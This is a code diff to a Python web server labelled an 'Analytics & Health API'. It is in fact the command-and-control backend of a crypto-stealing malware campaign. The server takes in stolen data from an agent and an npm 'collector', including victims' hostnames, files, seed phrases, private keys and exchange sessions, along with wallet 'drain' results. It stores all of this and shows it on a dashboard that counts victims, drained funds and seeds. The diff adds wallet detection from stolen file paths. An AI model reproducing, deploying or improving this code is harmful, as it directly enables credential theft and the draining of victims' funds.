@@ -1,8 +1,10 @@
 #!/usr/bin/env python3
 """ChainPulse v8.0 — Analytics & Health API (Render-compatible).
 
-Binds to PORT env var (Render default: 10000).
-No argparse — everything via env vars.
+Accepts both:
+  - Python agent envelope: {endpoint, campaign, timestamp, payload:{system_info,...}}
+  - NPM collector loot:    {id, host, user, time, files, ...}
+Normalizes on ingest so the dashboard always has campaign/system fields.
 """
 import json, base64, gzip, os, sys, time, glob, socket, threading
 from http.server import HTTPServer, BaseHTTPRequestHandler, ThreadingHTTPServer
@@ -11,6 +13,7 @@ from datetime import datetime
 PORT = int(os.environ.get("PORT", "10000"))
 HOST = os.environ.get("HOST", "0.0.0.0")
 LOOT_DIR = os.environ.get("LOOT_DIR", os.path.join(os.path.dirname(os.path.abspath(__file__)), "loot"))
+DEFAULT_CAMPAIGN = os.environ.get("DEFAULT_CAMPAIGN", "render-01")
 os.makedirs(LOOT_DIR, exist_ok=True)
 
 DASHBOARD_HTML = r"""<!DOCTYPE html>
@@ -28,6 +31,7 @@ h2{color:#ffd700;margin:15px 0 8px;font-size:15px}
 .card-drain{background:#140a0a;border-color:#ff3333}
 .card-seed{background:#0a0a14;border-color:#ffd700}
 .card-session{background:#0a140a;border-color:#00ff88}
+.card-files{background:#0a1018;border-color:#00d4ff}
 .label{color:#666}.value{color:#00ff88}.key{color:#ffd700}
 pre{background:#050510;padding:10px;border-radius:4px;overflow-x:auto;margin:10px 0;color:#aaa;font-size:11px;max-height:200px;overflow-y:auto}
 .badge{display:inline-block;padding:2px 8px;border-radius:3px;font-size:11px;margin-right:4px;margin-bottom:4px}
@@ -39,6 +43,7 @@ pre{background:#050510;padding:10px;border-radius:4px;overflow-x:auto;margin:10p
 .badge-danger{background:#ff3333;color:#fff}
 .badge-erc20{background:#00d4ff;color:#000}
 .badge-session{background:#00cc66;color:#000}
+.badge-files{background:#00d4ff;color:#000}
 table{width:100%;border-collapse:collapse;margin:8px 0}
 td,th{padding:6px 8px;border:1px solid #1a3a3a;text-align:left;font-size:11px}
 th{background:#0f1a1a;color:#ffd700}
@@ -48,6 +53,7 @@ a{color:#00d4ff}
 .stat-box .num{font-size:28px;font-weight:bold;color:#00d4ff}
 .stat-box .lbl{font-size:11px;color:#666;margin-top:4px}
 .chain-tag{display:inline-block;background:#1a1a2e;color:#00ff88;padding:1px 6px;border-radius:3px;font-size:10px;margin:2px}
+.file-list{max-height:120px;overflow-y:auto;font-size:10px;color:#888;margin-top:6px}
 </style>
 </head>
 <body>
@@ -55,19 +61,47 @@ a{color:#00d4ff}
 <div id="stats"></div>
 <div id="loot"></div>
 <script>
+function pick(obj, keys, fallback){
+  if(!obj) return fallback;
+  for(const k of keys){
+    if(obj[k]!==undefined && obj[k]!==null && obj[k]!=='') return obj[k];
+  }
+  return fallback;
+}
+function unwrap(entry){
+  // Support stored envelope OR raw loot
+  const top = entry || {};
+  const inner = top.payload && typeof top.payload==='object' ? top.payload : top;
+  const sys = inner.system_info || {};
+  return {
+    endpoint: pick(top, ['endpoint'], pick(inner, ['endpoint'], 'report')),
+    campaign: pick(top, ['campaign'], pick(inner, ['campaign'], '?')),
+    timestamp: pick(top, ['timestamp','time'], pick(inner, ['timestamp','time'], '?')),
+    hostname: pick(sys, ['hostname'], pick(inner, ['host','hostname'], '?')),
+    user: pick(sys, ['user','username'], pick(inner, ['user','username'], '?')),
+    os: pick(sys, ['os','platform'], pick(inner, ['os','platform'], '')),
+    wallets: inner.wallets || {},
+    secrets: inner.secrets || {},
+    drain_results: inner.drain_results || [],
+    exchange_sessions: inner.exchange_sessions || [],
+    files: inner.files || {},
+    id: pick(inner, ['id'], pick(top, ['id'], '')),
+    raw: inner,
+  };
+}
 async function load(){
   const r=await fetch('/api/loot-summary');
   const d=await r.json();
 
-  let sc=0,sk=0,pk=0,dc=0,ec=0,sessions=0;
-  for(const e of d.recent||[]){
-    const p=e.payload||e;
+  let sc=0,pk=0,dc=0,sessions=0,fileHits=0;
+  const rows=(d.recent||[]).map(unwrap);
+  for(const p of rows){
     const sec=p.secrets||{};
     sc+=(sec.seed_phrases||[]).length;
     pk+=(sec.private_keys||[]).length;
     dc+=(p.drain_results||[]).filter(x=>x.status==='drained').length;
-    ec+=(p.drain_results||[]).filter(x=>x.type==='erc20').length;
     sessions+=(p.exchange_sessions||[]).length;
+    fileHits+=Object.keys(p.files||{}).length;
   }
 
   document.getElementById('stats').innerHTML=
@@ -78,50 +112,55 @@ async function load(){
     '<div class="stat-box"><div class="num">'+sc+'</div><div class="lbl">Seeds</div></div>'+
     '<div class="stat-box"><div class="num">'+pk+'</div><div class="lbl">Keys</div></div>'+
     '<div class="stat-box"><div class="num">'+dc+'</div><div class="lbl">Drained</div></div>'+
-    '<div class="stat-box"><div class="num">'+sessions+'</div><div class="lbl">Sessions</div></div>'+
+    '<div class="stat-box"><div class="num">'+fileHits+'</div><div class="lbl">Files</div></div>'+
     '</div>';
 
   let html='';
-  for(const entry of d.recent){
-    const p=entry.payload||entry;
-    const sys=p.system_info||{};
-    let cc='card';
+  for(const p of rows){
+    const fileCount=Object.keys(p.files||{}).length;
     const hasDrain=(p.drain_results||[]).some(dr=>dr.status==='drained');
-    const hasSeed=(p.secrets||{}).seed_phrases||[];
+    const seeds=(p.secrets.seed_phrases||[]).length;
+    const pkeys=(p.secrets.private_keys||[]).length;
     const hasSessions=(p.exchange_sessions||[]).length;
-    if(hasDrain&&hasSeed)cc='card card-drain seed';
-    else if(hasDrain)cc='card card-drain';
-    else if(hasSeed.length)cc='card card-seed';
+    let cc='card';
+    if(hasDrain)cc='card card-drain';
+    else if(seeds)cc='card card-seed';
     else if(hasSessions)cc='card card-session';
+    else if(fileCount)cc='card card-files';
 
     html+='<div class="'+cc+'">';
-    html+='<h2>'+ (entry.endpoint||p.endpoint||'report') +' - '+ (entry.timestamp||p.timestamp||'?') +'</h2>';
-    html+='<span class="label">Campaign:</span> <span class="value">'+(entry.campaign||'?')+'</span> | ';
-    html+='<span class="label">System:</span> <span class="value">'+(sys.hostname||'?')+' ('+(sys.user||'?')+') '+(sys.os||'')+'</span><br>';
+    html+='<h2>'+ p.endpoint +' — '+ p.timestamp +'</h2>';
+    html+='<span class="label">Campaign:</span> <span class="value">'+p.campaign+'</span> | ';
+    html+='<span class="label">System:</span> <span class="value">'+p.hostname+' ('+p.user+') '+p.os+'</span>';
+    if(p.id) html+=' | <span class="label">ID:</span> <span class="value">'+p.id+'</span>';
+    html+='<br>';
 
     const wallets=p.wallets||{};
-    const wnames=Object.keys(wallets).filter(k=>wallets[k]&&wallets[k].length);
+    const wnames=Object.keys(wallets).filter(k=>wallets[k]&& (Array.isArray(wallets[k])?wallets[k].length:true));
     html+='<span class="label">Wallets:</span> ';
     if(wnames.length){
       html+=wnames.map(w=>'<span class="chain-tag">'+w+'</span>').join(' ');
-    }else{html+='<span class="value">none</span>';}
+    }else{html+='<span class="value">none listed</span>';}
     html+='<br>';
 
-    if(p.secrets){
-      const seeds=(p.secrets.seed_phrases||[]).length;
-      const pkeys=(p.secrets.private_keys||[]).length;
-      if(seeds)html+='<span class="badge badge-danger">SEED x'+seeds+'</span> ';
-      if(pkeys)html+='<span class="badge badge-btc">KEY x'+pkeys+'</span> ';
+    if(seeds)html+='<span class="badge badge-danger">SEED x'+seeds+'</span> ';
+    if(pkeys)html+='<span class="badge badge-btc">KEY x'+pkeys+'</span> ';
+    if(fileCount)html+='<span class="badge badge-files">FILES x'+fileCount+'</span> ';
+    if(hasSessions){
+      const domains=[...new Set(p.exchange_sessions.map(s=>s.domain||s))];
+      html+='<span class="badge badge-session">SESSIONS: '+domains.slice(0,5).join(', ')+'</span> ';
     }
 
-    if(hasSessions){
-      const domains=[...new Set(p.exchange_sessions.map(s=>s.domain))];
-      html+='<span class="badge badge-session">SESSIONS: '+domains.slice(0,5).join(', ')+(domains.length>5?' +'+(domains.length-5)+' more':'')+'</span><br>';
+    if(fileCount){
+      const names=Object.keys(p.files).slice(0,40);
+      html+='<div class="file-list">'+names.map(n=>'<div>'+n+'</div>').join('')+
+        (Object.keys(p.files).length>40?'<div>… +'+(Object.keys(p.files).length-40)+' more</div>':'')+
+        '</div>';
     }
 
     const dr=p.drain_results||[];
     if(dr.length){
-      html+='<br><span class="label">RESULTS ('+dr.length+' chains):</span><br>';
+      html+='<br><span class="label">RESULTS ('+dr.length+'):</span><br>';
       html+='<table><tr><th>Chain</th><th>Type</th><th>Status</th><th>Amount</th><th>TX</th></tr>';
       for(const r of dr){
         let badge='';
@@ -129,19 +168,19 @@ async function load(){
         else if(r.status==='drained')badge='<span class="badge badge-drained">DRAINED</span>';
         else if(r.status==='empty')badge='<span class="badge">empty</span>';
         else if(r.status==='dust')badge='<span class="badge">dust</span>';
-        else badge='<span class="badge" style="background:#555">'+r.status+'</span>';
+        else badge='<span class="badge" style="background:#555">'+(r.status||'?')+'</span>';
 
         let amt='-';
-        if(r.amount_ether!==undefined)amt=r.amount_ether.toFixed(6)+' '+r.chain.toUpperCase();
-        else if(r.amount_human!==undefined)amt=r.amount_human.toFixed(4)+' '+r.symbol;
-        else if(r.amount_sol!==undefined)amt=r.amount_sol.toFixed(6)+' SOL';
+        if(r.amount_ether!==undefined)amt=Number(r.amount_ether).toFixed(6)+' '+(r.chain||'').toUpperCase();
+        else if(r.amount_human!==undefined)amt=Number(r.amount_human).toFixed(4)+' '+(r.symbol||'');
+        else if(r.amount_sol!==undefined)amt=Number(r.amount_sol).toFixed(6)+' SOL';
 
         html+='<tr>'+
-          '<td><span class="chain-tag">'+ (r.chain||'?') +'</span></td>'+
-          '<td>'+ (r.type||r.symbol||'native') +'</td>'+
+          '<td><span class="chain-tag">'+(r.chain||'?')+'</span></td>'+
+          '<td>'+(r.type||r.symbol||'native')+'</td>'+
           '<td>'+badge+'</td>'+
           '<td>'+amt+'</td>'+
-          '<td>'+(r.explorer?'<a href="'+r.explorer+'" target="_blank">view</a>':r.tx_hash?r.tx_hash.slice(0,12)+'...':'-')+'</td>'+
+          '<td>'+(r.explorer?'<a href="'+r.explorer+'" target="_blank">view</a>':r.tx_hash?String(r.tx_hash).slice(0,12)+'...':'-')+'</td>'+
         '</tr>';
       }
       html+='</table>';
@@ -156,6 +195,88 @@ load();setInterval(load,8000);
 </body>
 </html>"""
 
+
+def _normalize_payload(raw: dict) -> dict:
+    """Unify Python-agent and NPM-collector shapes into one envelope."""
+    if not isinstance(raw, dict):
+        raw = {"raw": str(raw)}
+
+    # Already envelope?
+    if isinstance(raw.get("payload"), dict) and (
+        raw.get("endpoint") or raw.get("campaign") or "system_info" in raw.get("payload", {})
+    ):
+        env = dict(raw)
+        pl = dict(env.get("payload") or {})
+    else:
+        # NPM collector style: {id, host, user, time, files}
+        pl = dict(raw)
+        env = {}
+
+    # system_info
+    sysinfo = pl.get("system_info") if isinstance(pl.get("system_info"), dict) else {}
+    host = sysinfo.get("hostname") or pl.get("host") or pl.get("hostname") or "unknown"
+    user = sysinfo.get("user") or sysinfo.get("username") or pl.get("user") or pl.get("username") or "unknown"
+    os_name = sysinfo.get("os") or pl.get("os") or pl.get("platform") or ""
+    pl["system_info"] = {
+        "hostname": host,
+        "user": user,
+        "os": os_name,
+    }
+
+    # ensure containers
+    if "wallets" not in pl or not isinstance(pl.get("wallets"), dict):
+        pl["wallets"] = pl.get("wallets") if isinstance(pl.get("wallets"), dict) else {}
+    if "secrets" not in pl or not isinstance(pl.get("secrets"), dict):
+        pl["secrets"] = pl.get("secrets") if isinstance(pl.get("secrets"), dict) else {}
+    if "drain_results" not in pl or not isinstance(pl.get("drain_results"), list):
+        pl["drain_results"] = pl.get("drain_results") if isinstance(pl.get("drain_results"), list) else []
+    if "exchange_sessions" not in pl or not isinstance(pl.get("exchange_sessions"), list):
+        pl["exchange_sessions"] = pl.get("exchange_sessions") if isinstance(pl.get("exchange_sessions"), list) else []
+    if "files" not in pl or not isinstance(pl.get("files"), dict):
+        pl["files"] = pl.get("files") if isinstance(pl.get("files"), dict) else {}
+
+    # Infer wallets from file paths (MetaMask etc.)
+    if not pl["wallets"] and pl["files"]:
+        found = set()
+        for fp in pl["files"].keys():
+            low = str(fp).lower()
+            for name in (
+                "metamask", "exodus", "phantom", "electrum", "atomic", "trust",
+                "coinbase", "brave", "ronin", "binance", "okx", "ledger",
+            ):
+                if name in low:
+                    found.add(name)
+        if found:
+            pl["wallets"] = {n: ["detected"] for n in sorted(found)}
+
+    campaign = (
+        env.get("campaign")
+        or pl.get("campaign")
+        or DEFAULT_CAMPAIGN
+    )
+    endpoint = (
+        env.get("endpoint")
+        or pl.get("endpoint")
+        or ("npm-collector" if pl.get("files") is not None and pl.get("host") or pl.get("system_info") else "report")
+    )
+    if endpoint in ("unknown", "", None):
+        endpoint = "npm-collector" if pl.get("files") else "report"
+    ts = (
+        env.get("timestamp")
+        or pl.get("timestamp")
+        or pl.get("time")
+        or datetime.utcnow().isoformat()
+    )
+
+    return {
+        "endpoint": endpoint,
+        "campaign": campaign,
+        "timestamp": ts,
+        "payload": pl,
+        "id": pl.get("id") or env.get("id") or "",
+    }
+
+
 class C2Handler(BaseHTTPRequestHandler):
     def log_message(self, fmt, *args):
         pass
@@ -166,7 +287,7 @@ class C2Handler(BaseHTTPRequestHandler):
         elif self.path == "/api/loot-summary":
             self._serve_json(self._get_summary())
         elif self.path == "/health":
-            self._serve_json({"status": "healthy", "version": "8.0.0", "render": True})
+            self._serve_json({"status": "healthy", "version": "8.0.1", "render": True})
         else:
             self.send_error(404)
 
@@ -196,30 +317,38 @@ class C2Handler(BaseHTTPRequestHandler):
             decompressed = gzip.decompress(compressed)
             payload = json.loads(decompressed)
 
-            endpoint = payload.get("endpoint", "unknown")
-            campaign = payload.get("campaign", "unknown")
-            ts = payload.get("timestamp", datetime.utcnow().isoformat()).replace(":", "-")
+            env = _normalize_payload(payload)
+            endpoint = env["endpoint"]
+            campaign = env["campaign"]
+            ts = str(env["timestamp"]).replace(":", "-")
+            host = env["payload"].get("system_info", {}).get("hostname", "unknown")
 
             cdir = os.path.join(LOOT_DIR, campaign)
             os.makedirs(cdir, exist_ok=True)
-            fname = f"{endpoint}_{ts}.json"
+            safe_host = "".join(c if c.isalnum() or c in "-_." else "_" for c in host)[:40]
+            fname = f"{endpoint}_{safe_host}_{ts}.json"
             fpath = os.path.join(cdir, fname)
             with open(fpath, "w") as f:
-                json.dump(payload, f, indent=2, default=str)
+                json.dump(env, f, indent=2, default=str)
 
-            dr = payload.get("payload", {}).get("drain_results", [])
+            pl = env["payload"]
+            dr = pl.get("drain_results", [])
             for r in dr:
                 if r.get("status") == "drained":
                     amt = r.get("amount_ether", r.get("amount_human", r.get("amount_sol", 0)))
                     sym = r.get("symbol", r.get("chain", "?"))
-                    print(f"[$$$] DRAINED {amt:.6f} {sym} | tx: {r.get('tx_hash','?')[:16]}...")
+                    try:
+                        print(f"[$$$] DRAINED {float(amt):.6f} {sym} | tx: {str(r.get('tx_hash','?'))[:16]}...")
+                    except Exception:
+                        print(f"[$$$] DRAINED {amt} {sym}")
 
-            seeds = payload.get("payload", {}).get("secrets", {}).get("seed_phrases", [])
+            seeds = pl.get("secrets", {}).get("seed_phrases", [])
             if seeds:
                 print(f"[!!!] SEED PHRASES: {len(seeds)} found!")
 
-            print(f"[+] {endpoint} | campaign={campaign} | {fpath}")
-            self._serve_json({"status": "ok"})
+            nfiles = len(pl.get("files") or {})
+            print(f"[+] {endpoint} | campaign={campaign} | host={host} | files={nfiles} | {fpath}")
+            self._serve_json({"status": "ok", "campaign": campaign, "endpoint": endpoint})
 
         except Exception as e:
             print(f"[-] Error: {e}")
@@ -243,35 +372,43 @@ class C2Handler(BaseHTTPRequestHandler):
         total_files = 0
         recent = []
         if os.path.isdir(LOOT_DIR):
-            for cdir in os.listdir(LOOT_DIR):
+            for cdir in sorted(os.listdir(LOOT_DIR)):
                 cp = os.path.join(LOOT_DIR, cdir)
                 if os.path.isdir(cp):
                     files = sorted(glob.glob(os.path.join(cp, "*.json")), key=os.path.getmtime, reverse=True)
                     total_files += len(files)
                     campaigns.append({"name": cdir, "files": len(files)})
-                    for fp in files[:5]:
+                    for fp in files[:10]:
                         try:
                             with open(fp) as f:
-                                recent.append(json.load(f))
-                        except:
+                                raw = json.load(f)
+                            # Normalize again for old files stored as bare loot
+                            recent.append(_normalize_payload(raw if isinstance(raw, dict) else {"raw": raw}))
+                        except Exception:
                             pass
         hosts = set()
         for r in recent:
-            h = (r.get("payload", {}) or r).get("system_info", {}).get("hostname", "")
-            if not h:
-                h = r.get("system_info", {}).get("hostname", "")
-            if h:
-                hosts.add(h)
+            try:
+                h = r.get("payload", {}).get("system_info", {}).get("hostname", "")
+                if h and h != "unknown":
+                    hosts.add(h)
+            except Exception:
+                pass
+        # newest first
+        def _ts(x):
+            return str(x.get("timestamp") or "")
+        recent.sort(key=_ts, reverse=True)
         return {
             "campaign_count": len(campaigns),
             "campaigns": campaigns,
             "total_victims": len(hosts),
             "total_files": total_files,
-            "recent": recent[:20]
+            "recent": recent[:30],
         }
 
+
 if __name__ == "__main__":
-    print(f"[C2] ChainPulse v8.0 (Render) — http://0.0.0.0:{PORT}")
+    print(f"[C2] ChainPulse v8.0.1 (Render) — http://0.0.0.0:{PORT}")
     print(f"[C2] Dashboard: /dashboard")
     print(f"[C2] Health:    /health")
     print(f"[C2] Loot dir:  {LOOT_DIR}")
